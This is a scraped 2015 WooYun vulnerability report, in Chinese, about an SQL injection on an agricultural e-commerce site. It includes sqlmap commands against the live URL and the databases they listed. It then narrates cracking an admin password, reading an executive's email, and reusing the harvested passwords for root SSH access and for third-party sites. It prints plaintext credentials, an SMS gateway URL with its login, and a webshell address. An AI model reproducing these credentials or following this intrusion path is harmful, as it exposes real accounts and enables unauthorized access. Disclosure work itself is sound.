{"id": 82248, "wybug_id": "wooyun-2015-0151638", "wybug_title": "阿哥汇官网一个SQL注射漏洞引发的一连串问题", "wybug_corp": "北京士惠农业发展有限公司", "wybug_author": "system-admin", "wybug_date": "2015-11-10 10:26", "wybug_open_date": "2015-12-26 09:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向公众公开  简要描述： 互联网农资有点热。阿哥汇，一家服务农户的电子商城，官网www.agehui.com和www.agehui.cn均指向101.200.0.35，之前www.agehui.cn是指向103.41.54.112，这个IP打开后的首页现在仍是阿哥汇。阿哥汇属于北京士惠农业发展有限公司。此SQL注射漏洞首先导致官网101.200.0.35数据库沦陷后台被登录。用成功登录后台的账户可以访问该用户的邮箱，领导邮箱里存了不少密码，包括智联招聘账号、微信公共平台账号、奥瑞金公司官网账号等等。用该账户成功登录103.41.54.112的ssh远程。103.42.54.112虽然废弃不用了但并没清空网站文件，可以看到二次开发后的ecshop代码和短信验证码平台账号。士惠农业发展有限公司www.agrite.com.cn dede程序存漏洞请自查。 详细说明：  python sqlmap.py -u \"http://business.agehui.cn/find/seed/index?type_id=1*\" --dbsavailable databases [10]:[*] agehui_db[*] agridb[*] aksexpert[*] es_2117[*] es_new[*] experts[*] information_schema[*] mysql[*] performance_schema[*] testpython sqlmap.py -u \"http://business.agehui.cn/find/seed/index?type_id=1*\" --current-dbcurrent database:    'agehui_db'python sqlmap.py -u \"http://business.agehui.cn/find/seed/index?type_id=1*\" -D agehui_db --tables\n\n230个表。ecshop系统，直接找ecs_admin_user\n\n经解密dingwen 密码flying00 邮箱zhangdingwen@agrite.com.cn，请自行更改吧成功登陆101.200.0.35后台\n\nssh -l dingwen 103.41.54.112 密码同上 成功登陆 root权限\n\n可以看到二次开发后的网站文件仍在，根目录下还有es.sql index.php_old这些小毛病通过/home/www/shop的user.php可以看到短信验证码平台接口账户密码OperID=shfz&OperPass=shfz33，经验证是正确可用的\n\n测试短信接口http://221.179.180.158:9007/QxtSms/QxtFirewall?OperID=shfz&OperPass=shfz33&SendTime=&ValidTime=&AppendID=&DesMobile=你的手机号&Content=wooyun&ContentType=15成功收到短信息，可群发单发zhangdingwen@agrite.com.cn登录\n\n邮箱里面有不少信息其中奥瑞金官网密码经验证可用http://www.originseed.com.cn/webadmin/管理员zdw 密码shihui@origin数据库账号密码:root/ cjchnws.1服务器：root/zgyfjch@2013留给wooyun一个shell地址以便验证：http://www.originseed.com.cn/template/product/miniUpload.php而且这个网站/upload/file可遍历，可见里面有个php webshell智联招聘\n\n阿哥汇专家系统http://business.agehui.com/admin/login这个忘了记录了，是有这个密码的（不想再翻一遍邮件了）微信公共平台用户agehui@agrite.com.cn密码shny@agehui\n\n   漏洞证明：  见详细说明，有图有真相   修复方案：  让公司的IT人员针对上述问题解决下吧不知道服务器101.200.0.35的root密码是不是就是ecshop管理员中的某个密码，有cmd5付费账号的可以试一下，账户songtao的ec_salt为空\n\n   版权声明：转载请注明来源 system-admin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-11-11 09:57 厂商回复： 谢谢白帽子的共享精神 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}